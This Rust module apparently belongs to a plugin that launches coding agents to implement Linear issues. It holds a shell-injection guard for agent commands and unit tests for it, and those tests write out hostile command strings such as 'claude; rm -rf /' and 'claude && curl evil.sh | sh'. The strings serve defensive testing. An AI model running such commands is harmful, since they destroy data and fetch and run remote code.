//! Pure decision logic for the "implement this issue" flow triggered by `<Enter>` in an
//! issue list: deriving the preferred coding agent from other open herdr tabs, resolving
//! the final agent command, building the shell-wrapped argv to launch it, building the
//! literal prompt injected once the agent is ready, picking the right workflow state to
//! move the issue to, and building a per-issue display name so two issues implemented under
//! the same `agent_command` stay distinguishable in herdr's own pane/agent list (TF-590,
//! applied cosmetically via `herdr agent rename` since TF-624 — see [`build_agent_name`]).
//! No process/socket access here — see [`crate::plugin::herdr_cli`] for that; this module only
//! ever sees JSON text and in-memory values.

use crate::IssueState;
use serde::Deserialize;
use std::collections::HashMap;

#[derive(Deserialize)]
struct AgentListResult {
    agents: Vec<AgentEntry>,
}

#[derive(Deserialize)]
struct AgentEntry {
    agent: Option<String>,
}

/// Derive the preferred coding agent name from a herdr `agent list` JSON result (the
/// already-unwrapped `result` value — see [`crate::plugin::herdr_cli::agent_list`]): the most
/// frequent non-null `agent` value across all reported agent panes, ties broken by first-seen
/// order. Returns `None` on unparseable JSON, an empty agent list, or when every entry's
/// `agent` is null/absent/blank — all of which fall through to [`resolve_agent_command`]'s
/// config/default path.
pub fn resolve_preferred_agent(agent_list_json: &str) -> Option<String> {
    let parsed: AgentListResult = match serde_json::from_str(agent_list_json) {
        Ok(parsed) => parsed,
        Err(err) => {
            // Distinguishes "herdr's `agent list` schema changed" from "no agents currently
            // open" in the trace log — both otherwise fall through to the same `None`/default
            // path below, so this is the only signal a protocol drift here would leave behind.
            tracing::debug!("failed to parse `herdr agent list` output: {err}");
            return None;
        }
    };

    let mut counts: HashMap<&str, usize> = HashMap::new();
    let mut order: Vec<&str> = Vec::new();

    for entry in &parsed.agents {
        let Some(agent) = entry.agent.as_deref() else {
            continue;
        };
        if agent.trim().is_empty() {
            continue;
        }

        *counts.entry(agent).or_insert(0) += 1;
        if !order.contains(&agent) {
            order.push(agent);
        }
    }

    if order.is_empty() {
        return None;
    }

    // `max_by_key` returns the *last* element among ties, so iterate in reverse to make the
    // *first*-seen agent win ties (see the `_breaks_ties_by_first_seen_order` test below).
    order
        .iter()
        .rev()
        .max_by_key(|agent| counts[*agent])
        .map(|s| s.to_string())
}

/// Resolve the final agent command: an explicit `config_override` (`agent_command` in
/// `config.toml`) always wins, then `derived` (from other open tabs), then the `"hr"` default.
///
/// `config_override` is checked first — not `derived` — because herdr's `agent list` can only
/// ever report the *underlying binary* a pane is running (e.g. `"claude"`), never the shell
/// alias/wrapper used to launch it. A pane started via an `hr` alias that itself execs `claude`
/// (e.g. `alias hr='headroom wrap claude --memory --code-graph'`) is indistinguishable, from
/// herdr's point of view, from one started with bare `claude`. If `derived` won, an explicit
/// `agent_command = "hr"` (or the `"hr"` default) could never take effect once any other Claude
/// pane is open — which, in practice, is effectively always. An explicit config choice should
/// not be silently overridden by inference the plugin can't actually distinguish from the thing
/// it's meant to override.
pub fn resolve_agent_command(derived: Option<&str>, config_override: Option<&str>) -> String {
    config_override.or(derived).unwrap_or("hr").to_string()
}

/// True if `command` is safe to type as a literal command line into the tab's already-running
/// interactive shell (via `pane_run`) without unintended shell expansion: rejects command/
/// variable substitution, chaining, redirection, quoting, newlines, glob metacharacters, and
/// (since it's an interactive shell) `!` history expansion. Spaces and flags are allowed,
/// so a real-world `agent_command` value like `"headroom wrap claude --memory"` still passes.
/// `derived` (from `herdr agent list`) and `config_override` (the user's own `config.toml`) are
/// both low-risk inputs already, but this catches a mistyped/malicious value before it reaches
/// a shell.
pub fn is_valid_agent_command(command: &str) -> bool {
    !command.is_empty()
        && !command.chars().any(|c| {
            matches!(
                c,
                ';' | '&'
                    | '|'
                    | '$'
                    | '`'
                    | '<'
                    | '>'
                    | '('
                    | ')'
                    | '{'
                    | '}'
                    | '\n'
                    | '\r'
                    | '\\'
                    | '"'
                    | '\''
                    | '*'
                    | '?'
                    | '['
                    | ']'
                    | '~'
                    | '!'
            )
        })
}

/// An `agent_command` string that has passed [`is_valid_agent_command`], so `pane_run`'s caller
/// only ever receives a validated command rather than a bare `&str` — the shell-injection guard
/// is enforced by the compiler at every call site, not by remembering to call
/// `is_valid_agent_command` first and never reordering or bypassing that call in a future
/// refactor.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ValidatedAgentCommand(String);

impl ValidatedAgentCommand {
    /// Validates `command` via [`is_valid_agent_command`]. On failure, returns `command`
    /// unchanged as the `Err` payload so the caller can still report the rejected value in a
    /// status message.
    pub fn parse(command: String) -> std::result::Result<Self, String> {
        if is_valid_agent_command(&command) {
            Ok(Self(command))
        } else {
            Err(command)
        }
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// Build the literal prompt injected into the agent's pane once it's ready.
pub fn build_implement_prompt(identifier: &str) -> String {
    format!("Implement Linear Issue {identifier} using a new git worktree")
}

/// True if `prompt` is visible anywhere in `pane_text` (a `herdr agent read` snapshot). Used by
/// `main.rs`'s `send_prompt_until_visible` to confirm an
/// [`crate::plugin::herdr_cli::agent_prompt`] actually reached the target's input box, rather
/// than trusting `agent_wait`'s "idle" status alone — see
/// [`crate::plugin::herdr_cli::agent_read`]'s docs for the race this guards against.
///
/// Strips *all* whitespace from both sides before comparing. The implement prompt is long
/// enough (~55 chars) that a narrow `hr` pane — the common case, since it's usually a split
/// column — hard-wraps it across multiple screen lines, observed live even splitting mid-word
/// (no word-boundary wrapping) with a leading indent on continuation lines. A plain
/// `pane_text.contains(prompt)` never matches a wrapped rendering, which was previously
/// misread as "never landed" and triggered pointless resends (and, since `agent_prompt` appends
/// rather than replacing, visible duplication) even though the prompt had genuinely arrived.
pub fn prompt_landed(pane_text: &str, prompt: &str) -> bool {
    let strip_whitespace = |s: &str| s.chars().filter(|c| !c.is_whitespace()).collect::<String>();
    strip_whitespace(pane_text).contains(&strip_whitespace(prompt))
}

/// Build the per-issue display name applied to an issue's agent pane after it starts, via
/// [`crate::plugin::herdr_cli::agent_rename`] (TF-624). Every issue gets its own name derived
/// from the resolved `command` plus the issue's identifier, instead of the bare `command` string
/// being reused verbatim across every issue, so herdr's own pane/agent list distinguishes
/// concurrently-running issues at a glance.
///
/// This is now purely cosmetic. TF-590 originally introduced it to avoid a launch-time
/// `agent_name_taken` collision on `herdr agent start`, but herdr 0.8.0's CLI redesign
/// removed that call from this plugin entirely — nothing passes a name at launch anymore
/// (see [`crate::plugin::herdr_cli::pane_run`]), so there is no collision left to avoid and a
/// rename failure is a non-fatal warning rather than a reason to retry under a different name.
///
/// `command` and `issue_identifier` are sanitized *independently* (see `sanitize_agent_name`)
/// and joined with a `--` boundary, rather than concatenated first and sanitized as one string.
/// Sanitizing them together would let the command/identifier boundary itself get swallowed by
/// hyphen-collapsing, so two genuinely different `(command, issue_identifier)` pairs could
/// collide on the same generated name — e.g. naively joining then sanitizing
/// `("a b", "c")` and `("a", "b c")` both collapse to `"a-b-c"`. `sanitize_agent_name` never
/// itself produces a `--` (it collapses every run of non-alphanumeric characters into a
/// *single* hyphen and trims the ends), so the `--` here is unambiguously the boundary no
/// matter what either half contains, and a `(command, issue_identifier)` pair can be recovered
/// from the result by splitting on the first `--`.
pub fn build_agent_name(command: &str, issue_identifier: &str) -> String {
    format!(
        "{}--{}",
        sanitize_agent_name(command),
        sanitize_agent_name(issue_identifier)
    )
}

/// Lowercases `raw` and collapses every run of one-or-more characters outside `[a-z0-9]` into
/// a single hyphen, trimming leading/trailing hyphens — the character set herdr's own
/// generated agent names (e.g. `"hr-2"`) follow, assumed here to be the same set herdr accepts
/// for `agent rename <pane> <name>` itself. Falls back to `"agent"` if nothing alphanumeric
/// survives, so this never returns an empty string. Never produces a `--`, which
/// [`build_agent_name`] relies on to join two sanitized halves unambiguously.
fn sanitize_agent_name(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    for ch in raw.chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch.to_ascii_lowercase());
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    let trimmed = out.trim_matches('-');
    if trimmed.is_empty() {
        "agent".to_string()
    } else {
        trimmed.to_string()
    }
}

/// Pick the workflow state to move an issue to when starting implementation: a
/// case-insensitive name match on `"In Progress"` first, else the first `type == "started"`
/// state, else `None`.
pub fn pick_in_progress_state(states: &[IssueState]) -> Option<&IssueState> {
    states
        .iter()
        .find(|s| s.name.eq_ignore_ascii_case("in progress"))
        .or_else(|| states.iter().find(|s| s.r#type == "started"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn state(id: &str, name: &str, r#type: &str) -> IssueState {
        IssueState {
            id: id.to_string(),
            name: name.to_string(),
            r#type: r#type.to_string(),
        }
    }

    #[test]
    fn resolve_preferred_agent_returns_the_most_frequent_agent() {
        let json = r#"{"agents":[{"agent":"claude"},{"agent":"claude"},{"agent":"codex"}]}"#;

        assert_eq!(resolve_preferred_agent(json), Some("claude".to_string()));
    }

    #[test]
    fn resolve_preferred_agent_breaks_ties_by_first_seen_order() {
        let json = r#"{"agents":[{"agent":"codex"},{"agent":"claude"}]}"#;

        assert_eq!(resolve_preferred_agent(json), Some("codex".to_string()));
    }

    #[test]
    fn resolve_preferred_agent_skips_panes_without_an_agent_field() {
        let json = r#"{"agents":[{"agent_status":"unknown"},{"agent":"claude"}]}"#;

        assert_eq!(resolve_preferred_agent(json), Some("claude".to_string()));
    }

    #[test]
    fn resolve_preferred_agent_returns_none_for_an_empty_list() {
        assert_eq!(resolve_preferred_agent(r#"{"agents":[]}"#), None);
    }

    #[test]
    fn resolve_preferred_agent_returns_none_when_every_entry_has_no_agent() {
        let json = r#"{"agents":[{"agent_status":"unknown"},{"agent_status":"idle"}]}"#;

        assert_eq!(resolve_preferred_agent(json), None);
    }

    #[test]
    fn resolve_preferred_agent_returns_none_when_every_agent_is_blank() {
        let json = r#"{"agents":[{"agent":""},{"agent":"   "}]}"#;

        assert_eq!(resolve_preferred_agent(json), None);
    }

    #[test]
    fn resolve_preferred_agent_returns_none_for_malformed_json() {
        assert_eq!(resolve_preferred_agent("not json"), None);
    }

    #[test]
    fn resolve_preferred_agent_counts_by_frequency_not_by_seen_order() {
        // "codex" is seen first but "claude" is reported twice — a naive "return the
        // first-seen non-blank agent" implementation would wrongly return "codex" here.
        let json = r#"{"agents":[{"agent":"codex"},{"agent":"claude"},{"agent":"claude"}]}"#;

        assert_eq!(resolve_preferred_agent(json), Some("claude".to_string()));
    }

    #[test]
    fn resolve_agent_command_prefers_the_config_override_over_derived() {
        // An explicit `agent_command` always wins — herdr's `agent list` can't tell an
        // alias-launched agent from a bare one, so `derived` must never silently override it.
        assert_eq!(resolve_agent_command(Some("claude"), Some("hr")), "hr");
    }

    #[test]
    fn resolve_agent_command_falls_back_to_derived_when_no_override_is_set() {
        assert_eq!(resolve_agent_command(Some("codex"), None), "codex");
    }

    #[test]
    fn resolve_agent_command_falls_back_to_hr_by_default() {
        assert_eq!(resolve_agent_command(None, None), "hr");
    }

    #[test]
    fn build_implement_prompt_matches_the_exact_wording() {
        assert_eq!(
            build_implement_prompt("TF-563"),
            "Implement Linear Issue TF-563 using a new git worktree"
        );
    }

    #[test]
    fn prompt_landed_is_true_when_the_prompt_is_visible_in_the_pane() {
        let prompt = build_implement_prompt("TF-579");
        let pane_text = format!("some banner\n\n❯ {prompt}\n");

        assert!(prompt_landed(&pane_text, &prompt));
    }

    #[test]
    fn prompt_landed_is_false_when_the_prompt_is_absent() {
        let prompt = build_implement_prompt("TF-579");
        let pane_text = "❯ \n";

        assert!(!prompt_landed(pane_text, &prompt));
    }

    #[test]
    fn prompt_landed_is_false_on_empty_pane_text() {
        let prompt = build_implement_prompt("TF-579");

        assert!(!prompt_landed("", &prompt));
    }

    #[test]
    fn prompt_landed_is_true_when_a_narrow_pane_word_wraps_the_prompt() {
        let prompt = build_implement_prompt("TF-579");
        // A narrow `hr` split column wraps the prompt across several lines with a leading
        // indent on continuations — mirrors what a real ratatui `Wrap` produces.
        let pane_text = "❯ Implement Linear\n  Issue TF-579 using\n  a new git worktree\n";

        assert!(prompt_landed(pane_text, &prompt));
    }

    #[test]
    fn prompt_landed_is_true_when_wrapping_splits_mid_word() {
        let prompt = build_implement_prompt("TF-579");
        // Observed live: some renders hard-wrap mid-token with no word-boundary awareness.
        let pane_text = "❯ Implement Linear Issue TF-579 using a new git wor\n  ktree\n";

        assert!(prompt_landed(pane_text, &prompt));
    }

    #[test]
    fn build_agent_name_combines_command_and_issue_identifier() {
        assert_eq!(build_agent_name("hr", "TF-579"), "hr--tf-579");
    }

    #[test]
    fn build_agent_name_is_unique_per_issue() {
        // The whole point of TF-590: two issues started under the same `agent_command` must
        // not end up sharing one display name in herdr's pane/agent list.
        let a = build_agent_name("hr", "TF-579");
        let b = build_agent_name("hr", "TF-588");

        assert_ne!(a, b);
    }

    #[test]
    fn build_agent_name_sanitizes_spaces_and_flags_in_the_command() {
        assert_eq!(
            build_agent_name("headroom wrap claude --memory", "TF-579"),
            "headroom-wrap-claude-memory--tf-579"
        );
    }

    #[test]
    fn build_agent_name_falls_back_when_nothing_alphanumeric_survives() {
        assert_eq!(build_agent_name("!!!", "###"), "agent--agent");
    }

    #[test]
    fn build_agent_name_does_not_collide_across_different_command_identifier_boundaries() {
        // Regression guard: naively sanitizing `"{command}-{issue_identifier}"` as one string
        // let the command/identifier boundary get swallowed by hyphen-collapsing — different
        // pairs could produce the same name (e.g. both of these used to sanitize to
        // `"a-b-c"`). Sanitizing each half independently and joining with `--` (which
        // `sanitize_agent_name` never itself produces) closes that gap.
        let a = build_agent_name("a b", "c");
        let b = build_agent_name("a", "b c");

        assert_ne!(a, b);
        assert_eq!(a, "a-b--c");
        assert_eq!(b, "a--b-c");
    }

    #[test]
    fn pick_in_progress_state_matches_by_name_case_insensitively() {
        let states = vec![
            state("s1", "Backlog", "backlog"),
            state("s2", "in progress", "started"),
            state("s3", "In Review", "started"),
        ];

        let picked = pick_in_progress_state(&states).unwrap();

        assert_eq!(picked.id, "s2");
    }

    #[test]
    fn pick_in_progress_state_falls_back_to_the_first_started_type() {
        let states = vec![
            state("s1", "Backlog", "backlog"),
            state("s2", "In Review", "started"),
            state("s3", "Done", "completed"),
        ];

        let picked = pick_in_progress_state(&states).unwrap();

        assert_eq!(picked.id, "s2");
    }

    #[test]
    fn pick_in_progress_state_returns_none_when_no_state_matches() {
        let states = vec![
            state("s1", "Backlog", "backlog"),
            state("s2", "Done", "completed"),
        ];

        assert_eq!(pick_in_progress_state(&states), None);
    }

    #[test]
    fn pick_in_progress_state_returns_none_for_an_empty_list() {
        assert_eq!(pick_in_progress_state(&[]), None);
    }

    #[test]
    fn pick_in_progress_state_prefers_a_name_match_over_an_earlier_started_type() {
        // "Todo" is `started`-typed and comes first — a wrongly-ordered `find`/`or_else`
        // (type fallback checked before the name match) would return it instead of the
        // later "In Progress" state.
        let states = vec![
            state("s1", "Todo", "started"),
            state("s2", "In Progress", "started"),
        ];

        let picked = pick_in_progress_state(&states).unwrap();

        assert_eq!(picked.id, "s2");
    }

    #[test]
    fn is_valid_agent_command_accepts_plain_names_and_flags() {
        assert!(is_valid_agent_command("claude"));
        assert!(is_valid_agent_command("hr"));
        assert!(is_valid_agent_command("/usr/local/bin/claude"));
        assert!(is_valid_agent_command(
            "headroom wrap claude --memory --code-graph"
        ));
    }

    #[test]
    fn is_valid_agent_command_rejects_shell_metacharacters() {
        assert!(!is_valid_agent_command(""));
        assert!(!is_valid_agent_command("claude; rm -rf /"));
        assert!(!is_valid_agent_command("claude && curl evil.sh | sh"));
        assert!(!is_valid_agent_command("claude $(whoami)"));
        assert!(!is_valid_agent_command("claude `whoami`"));
        assert!(!is_valid_agent_command("claude > /etc/passwd"));
        assert!(!is_valid_agent_command("claude\nrm -rf /"));
    }

    #[test]
    fn is_valid_agent_command_rejects_glob_and_history_expansion_characters() {
        // `pane_run` types the command into the tab's already-interactive shell, so bash-style
        // history expansion (`!`) is live in addition to the usual glob metacharacters.
        assert!(!is_valid_agent_command("claude *"));
        assert!(!is_valid_agent_command("claude file?.txt"));
        assert!(!is_valid_agent_command("claude [a-z]"));
        assert!(!is_valid_agent_command("claude ~/bin/agent"));
        assert!(!is_valid_agent_command("claude !!"));
    }

    #[test]
    fn validated_agent_command_parse_accepts_a_valid_command() {
        let validated = ValidatedAgentCommand::parse("claude".to_string()).unwrap();

        assert_eq!(validated.as_str(), "claude");
    }

    #[test]
    fn validated_agent_command_parse_rejects_an_invalid_command_and_returns_it_back() {
        let err = ValidatedAgentCommand::parse("claude; rm -rf /".to_string()).unwrap_err();

        assert_eq!(err, "claude; rm -rf /");
    }
}
